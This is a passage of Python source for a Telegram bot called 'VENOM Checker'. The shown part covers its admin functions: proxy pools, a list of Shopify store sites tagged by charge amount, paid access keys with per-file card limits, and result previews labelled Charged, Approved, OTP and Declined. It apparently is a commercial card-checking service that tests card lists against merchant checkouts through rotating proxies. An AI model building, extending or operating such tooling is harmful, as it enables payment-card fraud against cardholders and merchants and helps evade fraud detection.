        await smsg.edit(pe(f"✅ <b>Proxy ALIVE!</b>{ip_line}\n<code>{proxy}</code>"), parse_mode='html')
    else:
        await smsg.edit(pe(f"❌ <b>Proxy DEAD!</b>\n<code>{proxy}</code>"), parse_mode='html')

# ─── SITE COMMANDS ─────────────────────────────────────────────────────────────
@bot.on(events.NewMessage(pattern=r'^/site$'))
async def site_command(event):
    uid = event.sender_id
    if not is_admin(uid): await event.reply(pe("❌ <b>Admin only.</b>"), parse_mode='html'); return
    sites   = load_sites()
    proxies = get_proxies_for_user(uid) or load_proxies()
    if not sites:   await event.reply(pe("❌ sites.txt is empty."), parse_mode='html'); return
    if not proxies: await event.reply(pe("❌ No proxies available."), parse_mode='html'); return
    smsg = await event.reply(pe(f"🔥 Checking {len(sites)} sites..."), parse_mode='html')
    alive, dead = [], []
    for i in range(0, len(sites), 10):
        batch   = sites[i:i+10]
        results = await asyncio.gather(*[test_site(s, random.choice(proxies)) for s in batch])
        for r in results: (alive if r['status']=='alive' else dead).append(r['site'])
        await smsg.edit(pe(f"🔥 Checking sites...\n✅ Alive: {len(alive)} | ❌ Dead: {len(dead)}"), parse_mode='html')
    async with aiofiles.open(SITES_FILE,'w') as f:
        for s in alive: await f.write(f"{s}\n")
    await smsg.edit(pe(f"✅ <b>Site Check Done!</b>\n\n✅ Alive: {len(alive)}\n❌ Removed: {len(dead)}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/(rm|rmsite)\s+'))
async def remove_site_command(event):
    uid = event.sender_id
    if not is_admin(uid): await event.reply(pe("❌ <b>Admin only.</b>"), parse_mode='html'); return
    url  = event.message.text.split(' ',1)[1].strip()
    curr = load_sites()
    if url not in curr: await event.reply(pe(f"❌ Site not found."), parse_mode='html'); return
    async with aiofiles.open(SITES_FILE,'w') as f:
        for s in curr:
            if s != url: await f.write(f"{s}\n")
    await event.reply(pe(f"✅ <b>Site removed!</b>\n<code>{url}</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/proxy$'))
async def proxy_command(event):
    uid = event.sender_id
    if not is_admin(uid): await event.reply(pe("❌ <b>Admin only.</b>"), parse_mode='html'); return
    proxies = load_proxies()
    if not proxies: await event.reply(pe("❌ proxy.txt is empty."), parse_mode='html'); return
    smsg = await event.reply(pe(f"🔥 Checking {len(proxies)} proxies..."), parse_mode='html')
    alive, dead = [], []
    for i in range(0, len(proxies), 50):
        results = await asyncio.gather(*[test_proxy(p) for p in proxies[i:i+50]])
        for r in results: (alive if r['status']=='alive' else dead).append(r['proxy'])
        await smsg.edit(pe(f"🔥 Checking proxies...\n✅ Alive: {len(alive)} | ❌ Dead: {len(dead)}"), parse_mode='html')
    async with aiofiles.open(PROXY_FILE,'w') as f:
        for p in alive: await f.write(f"{p}\n")
    await smsg.edit(pe(f"✅ <b>Proxy Check Done!</b>\n✅ Alive: {len(alive)}\n❌ Removed: {len(dead)}"), parse_mode='html')

# ─── KEY COMMANDS ──────────────────────────────────────────────────────────────
@bot.on(events.NewMessage(pattern=r'^/genkeys(\s+.*)?$'))
async def genkeys_command(event):
    if not is_admin(event.sender_id):
        await event.reply(pe("❌ <b>Admin only.</b>"), parse_mode='html'); return
    parts = event.message.text.split()
    if len(parts) < 3:
        await event.reply(pe(
            f"❌ <b>Usage:</b> <code>/genkeys [count] [days]</code>\n"
            f"Example: <code>/genkeys 20 1</code>"
        ), parse_mode='html'); return
    try:
        count = int(parts[1]); days = int(parts[2])
        if count < 1 or count > 100: raise ValueError
        if days < 1: raise ValueError
    except:
        await event.reply(pe("❌ Invalid. Example: <code>/genkeys 20 1</code>"), parse_mode='html'); return
    new_keys = []
    for _ in range(count):
        k = generate_key()
        while k in _keys_data: k = generate_key()
        _keys_data[k] = {"plan_days": days, "redeemed_by": None, "redeemed_at": None, "created_at": _now_utc().isoformat()}
        new_keys.append(k)
    save_keys()
    plan_label = f"{days} {'Day' if days == 1 else 'Days'} Plan"
    keys_text  = "\n".join([f"┣ 💖 <code>{k}</code>" for k in new_keys])
    msg = pe(
        f"📌🔥 <b>Keys Generated ✅</b>\n"
        f"<b>{SEP}</b>\n\n"
        f"┣ 👾 <b>Count</b> ➜ {count}\n"
        f"┣ 💎 <b>Plan</b> ➜ {plan_label}\n"
        f"┣ 💖 <b>Keys:</b>\n"
        f"{keys_text}\n\n"
        f"👿 <b>Users redeem with</b> <code>/redeem [key]</code>"
    )
    if len(msg) > 4000:
        fn = f"keys_{days}d_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        async with aiofiles.open(fn, 'w') as f:
            await f.write(f"Plan: {plan_label}\n\n")
            for k in new_keys: await f.write(f"{k}\n")
        await event.reply(pe(f"📌 <b>Generated {count} keys ({plan_label})</b>"), file=fn, parse_mode='html')
        try: os.remove(fn)
        except: pass
    else:
        await event.reply(msg, parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/listkeys$'))
async def listkeys_command(event):
    if not is_admin(event.sender_id):
        await event.reply(pe("❌ <b>Admin only.</b>"), parse_mode='html'); return
    if not _keys_data:
        await event.reply(pe("📋 No keys generated yet."), parse_mode='html'); return
    unused  = [(k,v) for k,v in _keys_data.items() if v.get('redeemed_by') is None]
    used    = [(k,v) for k,v in _keys_data.items() if v.get('redeemed_by') is not None]
    lines = [pe(f"<b>📋 Keys Summary</b>\n<b>{SEP}</b>\n🟢 Unused: {len(unused)} | 🔴 Used: {len(used)}\n<b>{SEP}</b>")]
    for k, v in unused[:20]:
        lines.append(f"🟢 <code>{k}</code> — {v.get('plan_days','?')}d")
    for k, v in used[:10]:
        lines.append(f"🔴 <code>{k}</code> — redeemed by <code>{v.get('redeemed_by','?')}</code>")
    if len(unused) > 20 or len(used) > 10:
        lines.append(f"\n<i>...send /genkeys to generate more</i>")
    await event.reply("\n".join(lines), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/delkey\s+'))
async def delkey_command(event):
    if not is_admin(event.sender_id):
        await event.reply(pe("❌ <b>Admin only.</b>"), parse_mode='html'); return
    key = event.message.text.split(None,1)[1].strip()
    if key not in _keys_data:
        await event.reply(pe(f"❌ Key not found: <code>{key}</code>"), parse_mode='html'); return
    del _keys_data[key]
    save_keys()
    await event.reply(pe(f"🔥 <b>Key deleted!</b>\n<code>{key}</code>"), parse_mode='html')

# ─── /redeem ───────────────────────────────────────────────────────────────────
@bot.on(events.NewMessage(pattern=r'^/redeem(\s+.*)?$'))
async def redeem_command(event):
    uid   = event.sender_id
    parts = event.message.text.split(None, 1)
    if len(parts) < 2 or not parts[1].strip():
        await event.reply(pe(f"❌ Usage: <code>/redeem {KEY_PREFIX}-XXXX</code>"), parse_mode='html'); return
    key = parts[1].strip()
    if key not in _keys_data:
        await event.reply(pe("❌ <b>Invalid key!</b> Double-check and try again."), parse_mode='html'); return
    kdata = _keys_data[key]
    if kdata.get('redeemed_by') is not None:
        await event.reply(pe("❌ <b>Key already redeemed!</b> Please use a different key."), parse_mode='html'); return
    plan_days = kdata['plan_days']
    set_user_access(uid, "key", plan_days, granted_by="key")
    _keys_data[key]['redeemed_by'] = uid
    _keys_data[key]['redeemed_at'] = _now_utc().isoformat()
    save_keys()
    plan_label = f"{plan_days} {'Day' if plan_days == 1 else 'Days'} Plan"
    trem       = time_remaining(uid)
    await event.reply(pe(
        f"✅ <b>Key Redeemed!</b>\n"
        f"<b>{SEP}</b>\n"
        f"💎 <b>Plan:</b> {plan_label}\n"
        f"⏳ <b>Expires in:</b> {trem}\n"
        f"📋 <b>Limit:</b> {get_user_limit(uid)} cards/file\n"
        f"<b>{SEP}</b>\n"
        f"Use /myplan to check your status anytime.\n"
        f"{DEV_LINE}"
    ), parse_mode='html')

# ─── /myplan ───────────────────────────────────────────────────────────────────
@bot.on(events.NewMessage(pattern=r'^/myplan$'))
async def myplan_command(event):
    uid  = event.sender_id
    tier = get_user_tier(uid)
    trem = time_remaining(uid)
    lim  = get_user_limit(uid)
    if is_admin(uid):
        await event.reply(pe(f"<b>👑 Admin Status</b>\n<b>{SEP}</b>\n⭐ Unlimited access\n🔥 Limit: 25000 cards/file"), parse_mode='html'); return
    if not tier:
        await event.reply(pe(f"❌ <b>No Active Plan</b>\n<b>{SEP}</b>\nRedeem a key: <code>/redeem {KEY_PREFIX}-XXXX</code>\nContact admin for access."), parse_mode='html'); return
    acc = _user_access.get(uid, {})
    exp = acc.get('expires_at', '')[:10]
    await event.reply(pe(
        f"<b>📋 My Plan</b>\n"
        f"<b>{SEP}</b>\n"
        f"💎 <b>Tier:</b> {tier.capitalize()}\n"
        f"📅 <b>Expires:</b> {exp}\n"
        f"⏳ <b>Remaining:</b> {trem or 'Expired'}\n"
        f"📋 <b>Limit:</b> {lim} cards/file\n"
        f"<b>{SEP}</b>\n"
        f"{DEV_LINE}"
    ), parse_mode='html')

# ─── /authuser & /deauthuser — quick auth/deauth ───────────────────────────────
@bot.on(events.NewMessage(pattern=r'^/authuser(\s+.*)?$'))
async def authuser_command(event):
    if not is_admin(event.sender_id):
        await event.reply(pe("❌ <b>Admin only.</b>"), parse_mode='html'); return
    parts = event.message.text.split()
    if len(parts) < 3:
        await event.reply(pe(
            f"❌ <b>Usage:</b> <code>/authuser [user_id] [days]</code>\n"
            f"Example: <code>/authuser 123456789 30</code>"
        ), parse_mode='html'); return
    try:
        target = int(parts[1]); days = int(parts[2])
        if days < 1: raise ValueError
    except:
        await event.reply(pe("❌ Invalid. Example: <code>/authuser 123456789 30</code>"), parse_mode='html'); return
    set_user_access(target, "auth", days, granted_by=str(event.sender_id))
    trem = time_remaining(target)
    await event.reply(pe(
        f"✅ <b>User Authorized!</b>\n"
        f"<b>{SEP}</b>\n"
        f"👤 <b>User:</b> <code>{target}</code>\n"
        f"💎 <b>Tier:</b> Auth\n"
        f"📅 <b>Days:</b> {days}\n"
        f"⏳ <b>Expires in:</b> {trem}\n"
        f"📋 <b>Limit:</b> {TIER_LIMITS['auth']} cards/file"
    ), parse_mode='html')
    try:
        await bot.send_message(target, pe(
            f"✅ <b>Access Granted!</b>\n"
            f"<b>{SEP}</b>\n"
            f"💎 <b>Plan:</b> Auth — {days} days\n"
            f"⏳ <b>Expires in:</b> {trem}\n"
            f"📋 <b>Limit:</b> {TIER_LIMITS['auth']} cards/file\n"
            f"<b>{SEP}</b>\n{DEV_LINE}"
        ), parse_mode='html')
    except: pass

@bot.on(events.NewMessage(pattern=r'^/deauthuser\s+'))
async def deauthuser_command(event):
    if not is_admin(event.sender_id):
        await event.reply(pe("❌ <b>Admin only.</b>"), parse_mode='html'); return
    parts = event.message.text.split()
    if len(parts) < 2:
        await event.reply(pe("❌ Usage: <code>/deauthuser [user_id]</code>"), parse_mode='html'); return
    try:
        target = int(parts[1])
    except:
        await event.reply(pe("❌ Invalid user ID."), parse_mode='html'); return
    revoke_user_access(target)
    curr = load_premium_users()
    if str(target) in curr:
        async with aiofiles.open(PREMIUM_FILE,'w') as f:
            for u in curr:
                if u != str(target): await f.write(f"{u}\n")
    await event.reply(pe(f"🚫 <b>User Deauthorized!</b>\n👤 <code>{target}</code> access revoked."), parse_mode='html')
    try:
        await bot.send_message(target, pe(
            f"❌ <b>Access Revoked</b>\n"
            f"<b>{SEP}</b>\n"
            f"Your access has been revoked by admin.\n"
            f"Contact admin to renew: <a href='https://t.me/{OWNER_USERNAME}'>{OWNER_NAME}</a>"
        ), parse_mode='html')
    except: pass

# ─── /userstatus — complete status of all users ────────────────────────────────
@bot.on(events.NewMessage(pattern=r'^/userstatus$'))
async def userstatus_command(event):
    if not is_admin(event.sender_id):
        await event.reply(pe("❌ <b>Admin only.</b>"), parse_mode='html'); return
    lines = [pe(f"<b>📊 Complete User Status</b>\n<b>{SEP}</b>")]
    # Admin IDs
    lines.append(f"\n👑 <b>Admins ({len(ADMIN_IDS)}):</b>")
    for aid in sorted(ADMIN_IDS):
        proxy = get_user_proxy(aid) or "None"
        lines.append(f"  • <code>{aid}</code> | Proxy: <code>{proxy[:30] if proxy != 'None' else 'None'}</code>")
    # Access users
    if _user_access:
        lines.append(f"\n🔑 <b>Access Users ({len(_user_access)}):</b>")
        for uid_str, acc in _user_access.items():
            uid_int = int(uid_str)
            tier    = acc.get('tier', '?')
            exp     = acc.get('expires_at', '')[:10]
            trem    = time_remaining(uid_int) or "Expired"
            proxy   = get_user_proxy(uid_int) or "None"
            pool_on = user_pool_enabled.get(uid_int, True)
            valid   = "✅" if is_access_valid(uid_int) else "❌"
            lines.append(
                f"  {valid} <code>{uid_str}</code>\n"
                f"     Tier: {tier} | Expires: {exp} | Left: {trem}\n"
                f"     Proxy: <code>{proxy[:30] if proxy != 'None' else 'None'}</code> | Pool: {'ON' if pool_on else 'OFF'}"
            )
    # Legacy premium
    prem = load_premium_users()
    if prem:
        lines.append(f"\n⭐ <b>Legacy Premium ({len(prem)}):</b>")
        for uid_str in prem:
            proxy = get_user_proxy(int(uid_str)) if uid_str.isdigit() else None
            proxy_str = f"<code>{proxy[:30]}</code>" if proxy else "None"
            lines.append(f"  • <code>{uid_str}</code> | Proxy: {proxy_str}")
    # Pool stats
    pool_size = len(load_proxies())
    sites_count = len(load_sites())
    lines.append(pe(
        f"\n<b>{SEP}</b>\n"
        f"📋 <b>Proxy Pool:</b> {pool_size}\n"
        f"🌐 <b>Sites:</b> {sites_count}\n"
        f"🔑 <b>Total Keys:</b> {len(_keys_data)}\n"
        f"🟢 <b>Unused Keys:</b> {sum(1 for v in _keys_data.values() if v.get('redeemed_by') is None)}"
    ))
    full_text = "\n".join(lines)
    if len(full_text) > 4000:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        fn = f"user_status_{ts}.txt"
        clean = re.sub(r'<[^>]+>', '', full_text)
        with open(fn, 'w') as f: f.write(clean)
        await event.reply(pe(f"📊 <b>User Status Report</b>"), file=fn, parse_mode='html')
        try: os.remove(fn)
        except: pass
    else:
        await event.reply(full_text, parse_mode='html')

# ─── /testcards ────────────────────────────────────────────────────────────────
@bot.on(events.NewMessage(pattern=r'^/testcards$'))
async def testcards_command(event):
    uid = event.sender_id
    if not is_admin(uid):
        await event.reply(pe("❌ <b>Admin only.</b>"), parse_mode='html'); return
    fake_bin = ("VISA", "Credit", "Classic", "Test Bank", "United States", "🇺🇸")
    statuses = [
        ("Charged",  "Payment captured successfully — $1.00 auth charge",   "Shopify Payments", "$1.00"),
        ("Approved", "Card approved — 3DS not required",                     "Shopify Payments", "$0.00"),
        ("OTP",      "3D Secure authentication required by issuing bank",    "Shopify Payments", "-"),
        ("Declined", "Your card was declined. Please try a different card.", "Shopify Payments", "-"),
    ]
    await event.reply(pe(f"<b>🧪 Test Cards Preview</b> — {len(statuses)} result types"), parse_mode='html')
    for status, message, gateway, price in statuses:
        fake_result = {'status': status, 'message': message, 'card': "4111111111111111|12|2026|123", 'gateway': gateway, 'price': price}
        card_msg = build_result_card(fake_result, fake_bin, uid, "VENOM Checker")
        await raw_send(uid, card_msg, [])
        await asyncio.sleep(0.4)

# ─── /admin ────────────────────────────────────────────────────────────────────
def _admin_panel_text():
    pcount = len(load_premium_users()) + len(_user_access)
    scount = len(load_sites())
    pxpool = len(load_proxies())
    kcount = len(_keys_data)
    unused = sum(1 for v in _keys_data.values() if v.get('redeemed_by') is None)
    return pe(
        f"<b>👑 Admin Panel — VENOM</b>\n"
        f"<b>{SEP}</b>\n"
        f"👤 <b>Total Users:</b> {pcount}\n"
        f"🌐 <b>Sites:</b> {scount}\n"
        f"⚙️ <b>Proxy Pool:</b> {pxpool}\n"
        f"🔑 <b>Keys:</b> {kcount} total | {unused} unused\n"
        f"<b>{SEP}</b>\n"
        f"{DEV_LINE}"
    )

@bot.on(events.NewMessage(pattern=r'^/admin$'))
async def admin_panel_cmd(event):
    if not is_admin(event.sender_id):
        await event.reply(pe("❌ <b>Admin only.</b>"), parse_mode='html'); return
    await raw_send(event.sender_id, _admin_panel_text(), rows_admin())

@bot.on(events.NewMessage(pattern=r'^/setadmin(\s+.*)?$'))
async def setadmin_command(event):
    global ADMIN_IDS, ADMIN_ID
    uid = event.sender_id
    if not is_admin(uid):
        await event.reply(pe("❌ <b>Admin only.</b>"), parse_mode='html'); return
    parts = event.message.text.strip().split()
    current_list = "\n".join(f"• <code>{a}</code>" for a in sorted(ADMIN_IDS))
    if len(parts) < 2:
        await event.reply(pe(
            f"<b>👑 Admin Management</b>\n<b>{SEP}</b>\n"
            f"<b>Current admins:</b>\n{current_list}\n<b>{SEP}</b>\n"
            f"<b>Add:</b> <code>/setadmin add [user_id]</code>\n"
            f"<b>Remove:</b> <code>/setadmin rm [user_id]</code>"
        ), parse_mode='html'); return
    action = parts[1].lower()
    if action in ("add", "rm", "remove") and len(parts) >= 3:
        try:
            target = int(parts[2])
        except ValueError:
            await event.reply(pe("❌ <b>Invalid user ID.</b>"), parse_mode='html'); return
        if action == "add":
            ADMIN_IDS.add(target)
            _save_admin_ids(ADMIN_IDS)
            ADMIN_ID = min(ADMIN_IDS)
            _register_commands()
            await event.reply(pe(f"✅ <b>Admin added:</b> <code>{target}</code>"), parse_mode='html')
        else:
            if target in _DEFAULT_ADMINS:
                await event.reply(pe("❌ <b>Cannot remove a default admin.</b>"), parse_mode='html'); return
            ADMIN_IDS.discard(target)
            _save_admin_ids(ADMIN_IDS)
            ADMIN_ID = min(ADMIN_IDS) if ADMIN_IDS else min(_DEFAULT_ADMINS)
            _register_commands()
            await event.reply(pe(f"✅ <b>Admin removed:</b> <code>{target}</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/addpremium\s+'))
async def add_premium_command(event):
    if not is_admin(event.sender_id): await event.reply(pe("❌ <b>Admin only.</b>"), parse_mode='html'); return
    new_id = event.message.text.split(' ',1)[1].strip()
    if not new_id.isdigit(): await event.reply(pe("❌ Usage: <code>/addpremium 123456789</code>"), parse_mode='html'); return
    curr = load_premium_users()
    if new_id in curr: await event.reply(pe(f"⚠️ User <code>{new_id}</code> already premium."), parse_mode='html'); return
    async with aiofiles.open(PREMIUM_FILE,'a') as f: await f.write(f"{new_id}\n")
    await event.reply(pe(f"✅ <b>Premium Added!</b>\n👑 User <code>{new_id}</code> now has access."), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/rmpremium\s+'))
async def remove_premium_command(event):
    if not is_admin(event.sender_id): await event.reply(pe("❌ <b>Admin only.</b>"), parse_mode='html'); return
    rm_id = event.message.text.split(' ',1)[1].strip()
    curr  = load_premium_users()
    if rm_id not in curr: await event.reply(pe(f"❌ User <code>{rm_id}</code> not in list."), parse_mode='html'); return
    async with aiofiles.open(PREMIUM_FILE,'w') as f:
        for u in curr:
            if u != rm_id: await f.write(f"{u}\n")
    await event.reply(pe(f"🚫 <b>Premium Removed!</b>\n❌ User <code>{rm_id}</code> removed."), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/listpremium$'))
async def list_premium_command(event):
    if not is_admin(event.sender_id): await event.reply(pe("❌ <b>Admin only.</b>"), parse_mode='html'); return
    curr = load_premium_users()
    if not curr: await event.reply(pe("📋 No legacy premium users found."), parse_mode='html'); return
    lines = "\n".join([f"{i+1}. <code>{u}</code>" for i,u in enumerate(curr)])
    await event.reply(pe(f"<b>📋 Legacy Premium Users ({len(curr)}):</b>\n\n{lines}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/tagsite(\s+.*)?$'))
async def tagsite_command(event):
    if not is_admin(event.sender_id):
        await event.reply(pe("❌ <b>Admin only.</b>"), parse_mode='html'); return
    parts = event.message.text.strip().split()
    if len(parts) < 3:
        meta  = load_sites_meta()
        sites = load_sites()
        tagged = sum(1 for s in sites if s in meta)
        tiers_count = {t: sum(1 for s in sites if meta.get(s,{}).get('tier')==t) for t in AMOUNT_TIERS if t!='any'}
        lines = "\n".join(f"  {v[0]}: {tiers_count.get(k,0)} sites" for k,v in AMOUNT_TIERS.items() if k!='any')
        await event.reply(pe(
            f"<b>🏷 Site Tier Tagger</b>\n"
            f"<b>{SEP}</b>\n"
            f"<b>Tagged:</b> {tagged} / {len(sites)} sites\n\n"
            f"{lines}\n\n"
            f"<b>Usage:</b>\n"
            f"<code>/tagsite https://shop.com 1</code>\n"
            f"<code>/tagsite https://shop.com 5</code>\n"
            f"<code>/tagsite https://shop.com 10</code>\n"
            f"<code>/tagsite https://shop.com 20</code>\n"
            f"<code>/tagsite https://shop.com any</code> — untag"
        ), parse_mode='html'); return
    url  = parts[1].strip().rstrip('/')
    tier = parts[2].strip().lower()
    if tier not in AMOUNT_TIERS:
        await event.reply(pe("❌ Valid tiers: <code>1</code> <code>5</code> <code>10</code> <code>20</code> <code>any</code>"), parse_mode='html'); return
    if url not in load_sites():
        await event.reply(pe(f"❌ Site not in sites list: <code>{url}</code>"), parse_mode='html'); return
    if tier == 'any':
        meta = load_sites_meta()
        meta.pop(url, None)
        save_sites_meta(meta)
        await event.reply(pe(f"✅ <b>Untagged</b> <code>{url}</code>"), parse_mode='html')
    else:
        tag_site_tier(url, tier)
        label = AMOUNT_TIERS[tier][0]
        await event.reply(pe(f"✅ Tagged <code>{url}</code> as <b>{label}</b>"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/addsite'))
async def add_site_command(event):
    uid = event.sender_id
    if not is_admin(uid):
        await event.reply(pe("❌ <b>Admin only.</b>"), parse_mode='html'); return

    # ── source 1: replied-to .txt file ───────────────────────────────────
    reply = await event.get_reply_message()
    if reply and reply.document:
        fname = getattr(reply.document.attributes[0], 'file_name', '') if reply.document.attributes else ''
        if fname.endswith('.txt') or reply.document.mime_type == 'text/plain':
            buf = await reply.download_media(bytes)
            if not buf:
                await event.reply(pe("❌ <b>Could not read file.</b>"), parse_mode='html'); return
            tokens = _tokenise(buf.decode('utf-8', errors='ignore'))
            await _add_sites_bulk(event, uid, tokens); return

    # ── source 2: command body (multiline or space-separated) ────────────
    content = event.message.text[len('/addsite'):].strip()
    if not content:
        await event.reply(pe(
            f"❌ <b>Usage:</b>\n<b>{SEP}</b>\n"
            f"<code>/addsite https://shop.com</code>\n\n"
            f"📌 Space-separated: <code>/addsite url1 url2 url3</code>\n"
            f"📝 Multi-line body or reply to a <code>.txt</code> file"
        ), parse_mode='html'); return

    tokens = _tokenise(content)
    if len(tokens) == 1:
        # single site — keep original snappy single-add response
        u = _normalise_site(tokens[0])
        if not _validate_site_fmt(u):
            await event.reply(pe("❌ URL must start with http:// or https://"), parse_mode='html'); return
        curr = load_sites()
        if u in curr:
            await event.reply(pe("⚠️ Site already exists."), parse_mode='html'); return
        async with aiofiles.open(SITES_FILE, 'a') as f: await f.write(f"{u}\n")
        await event.reply(pe(f"✅ <b>Site Added!</b>\n<code>{u}</code>"), parse_mode='html')
    else:
        await _add_sites_bulk(event, uid, tokens)

@bot.on(events.NewMessage(pattern=r'^/listsites$'))
async def list_sites_command(event):
    if not is_admin(event.sender_id): await event.reply(pe("❌ <b>Admin only.</b>"), parse_mode='html'); return
    curr = load_sites()
    if not curr: await event.reply(pe("📋 No sites found."), parse_mode='html'); return
    if len(curr) <= 30:
        lines = "\n".join([f"{i+1}. <code>{s}</code>" for i,s in enumerate(curr)])
        await event.reply(pe(f"<b>🌐 Sites ({len(curr)}):</b>\n\n{lines}"), parse_mode='html')
    else:
        fn = f"sites_list_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        async with aiofiles.open(fn,'w') as f:
            for i,s in enumerate(curr): await f.write(f"{i+1}. {s}\n")
        await event.reply(pe(f"<b>🌐 Total Sites: {len(curr)}</b>"), file=fn, parse_mode='html')
        try: os.remove(fn)
        except: pass

@bot.on(events.NewMessage(pattern=r'^/broadcast\s+'))
async def broadcast_command(event):
    if not is_admin(event.sender_id): await event.reply(pe("❌ <b>Admin only.</b>"), parse_mode='html'); return
    msg   = event.message.text.split(' ',1)[1].strip()
    users = load_premium_users()
    access_users = [str(k) for k in _user_access.keys()]
    all_users = list(set(users + access_users))
    if not all_users: await event.reply(pe("❌ No users to broadcast to."), parse_mode='html'); return
    bc = pe(
        f"<b>⚡ {BOT_BRAND}</b>\n<b>{SEP}</b>\n"
        f"<b>📡 Admin Broadcast</b>\n{msg}\n"
        f"<b>{SEP}</b>\n{owner_line()}"
    )
    smsg   = await event.reply(pe(f"🚀 Broadcasting to {len(all_users)} users..."), parse_mode='html')
    sent,failed = 0,0
    for uid in all_users:
        try: await bot.send_message(int(uid), bc, parse_mode='html'); sent+=1
        except: failed+=1
        await asyncio.sleep(0.1)
    await smsg.edit(pe(f"🚀 <b>Broadcast Done!</b>\n✅ Sent: {sent} | ❌ Failed: {failed}"), parse_mode='html')

# ══════════════════════════════════════════════════════════════════════════════
# CALLBACK QUERY HANDLERS
# ══════════════════════════════════════════════════════════════════════════════

@bot.on(events.CallbackQuery(pattern=b"admin_panel"))
async def cb_admin_panel(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True); return
    await event.answer()
    await nav_edit(event.chat_id, event.message_id, _admin_panel_text(), rows_admin())

@bot.on(events.CallbackQuery(pattern=b"admin_users"))
async def cb_admin_users(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True); return
    pcount = len(load_premium_users()) + len(_user_access)
    text   = pe(
        f"<b>👑 User Management</b>\n"
        f"<b>{SEP}</b>\n"
        f"<b>Total Users:</b> {pcount}\n"
        f"<b>Access Users:</b> {len(_user_access)}\n"
        f"<b>Legacy Premium:</b> {len(load_premium_users())}\n"
        f"<b>{SEP}</b>\n"
        f"<b>Commands:</b>\n"
        f"<code>/authuser [ID] [days]</code> — Grant access\n"
        f"<code>/deauthuser [ID]</code> — Revoke access\n"
        f"<code>/userstatus</code> — Full status report\n"
        f"<code>/addpremium [ID]</code> — Legacy add\n"
        f"<code>/rmpremium [ID]</code> — Legacy remove"
    )
    await event.answer()
    await nav_edit(event.chat_id, event.message_id, text, rows_admin_users())

@bot.on(events.CallbackQuery(pattern=b"admin_sites"))
async def cb_admin_sites(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True); return
    scount = len(load_sites())
    text   = pe(
        f"<b>🌐 Site Management</b>\n"
        f"<b>{SEP}</b>\n"
        f"<b>Total Sites:</b> {scount}\n"
        f"<b>{SEP}</b>\n"
        f"<b>Commands:</b>\n"
        f"<code>/addsite [url]</code> — Add site\n"
        f"<code>/rmsite [url]</code> — Remove site\n"
        f"<code>/listsites</code> — See all sites\n"
        f"<code>/site</code> — Health check all sites"
    )
    await event.answer()
    await nav_edit(event.chat_id, event.message_id, text, rows_admin_sites())

@bot.on(events.CallbackQuery(pattern=b"admin_proxy_pool"))
async def cb_admin_proxy_pool(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True); return
    pool   = load_proxies()
    sample = pool[0] if pool else "None"
    text   = pe(
        f"<b>⚙️ Proxy Pool Management</b>\n"
        f"<b>{SEP}</b>\n"
        f"<b>Pool Size:</b> {len(pool)} proxies\n"
        f"<b>Sample:</b> <code>{sample}</code>\n"
        f"<b>{SEP}</b>\n"
        f"<b>Commands:</b>\n"
        f"<code>/addproxy [proxy]</code> — Add proxy\n"
        f"<code>/rmproxy [proxy]</code> — Remove proxy\n"
        f"<code>/clearproxy</code> — Clear all\n"
        f"<code>/getproxy</code> — Get pool file\n"
        f"<code>/proxy</code> — Health check all"
    )
    await event.answer()
    await nav_edit(event.chat_id, event.message_id, text, rows_admin_proxy_pool())

@bot.on(events.CallbackQuery(pattern=b"admin_keys"))
async def cb_admin_keys(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True); return
    total  = len(_keys_data)
    unused = sum(1 for v in _keys_data.values() if v.get('redeemed_by') is None)
    used   = total - unused
    text   = pe(
        f"<b>🔑 Key Manager</b>\n"
        f"<b>{SEP}</b>\n"
        f"🟢 <b>Unused Keys:</b> {unused}\n"
        f"🔴 <b>Used Keys:</b> {used}\n"
        f"📋 <b>Total Keys:</b> {total}\n"
        f"<b>{SEP}</b>\n"
        f"<b>Commands:</b>\n"
        f"<code>/genkeys [count] [days]</code>\n"
        f"<code>/listkeys</code>\n"
        f"<code>/delkey [key]</code>"
    )
    await event.answer()
    await nav_edit(event.chat_id, event.message_id, text, rows_admin_keys())

@bot.on(events.CallbackQuery(pattern=b"admin_user_status"))
async def cb_admin_user_status(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True); return
    await event.answer("📊 Generating status report...", alert=False)
    await event.respond(pe(f"📊 Use <code>/userstatus</code> for the full detailed report."), parse_mode='html')

@bot.on(events.CallbackQuery(pattern=b"admin_broadcast_info"))
async def cb_admin_broadcast_info(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True); return
    total = len(load_premium_users()) + len(_user_access)
    await event.answer(f"📡 Send: /broadcast [message]\nWill reach {total} users.", alert=True)

@bot.on(events.CallbackQuery(pattern=b"admin_list_users"))
async def cb_admin_list_users(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True); return
    lines = []
    for uid_str, acc in list(_user_access.items())[:30]:
        tier  = acc.get('tier', '?')
        trem  = time_remaining(int(uid_str)) or "Expired"
        valid = "✅" if is_access_valid(int(uid_str)) else "❌"
        lines.append(f"{valid} <code>{uid_str}</code> — {tier} | {trem}")
    legacy = load_premium_users()[:10]
    for u in legacy:
        lines.append(f"⭐ <code>{u}</code> — Legacy Premium")
    if not lines:
        await event.answer("📋 No users found.", alert=True); return
    text = pe(f"<b>👑 Users ({len(_user_access) + len(load_premium_users())}):</b>\n\n" + "\n".join(lines))
    await event.answer()
    await nav_edit(event.chat_id, event.message_id, text, rows_admin_users())

@bot.on(events.CallbackQuery(pattern=b"admin_list_sites_cb"))
async def cb_admin_list_sites(event):
    if not is_admin(event.sender_id):
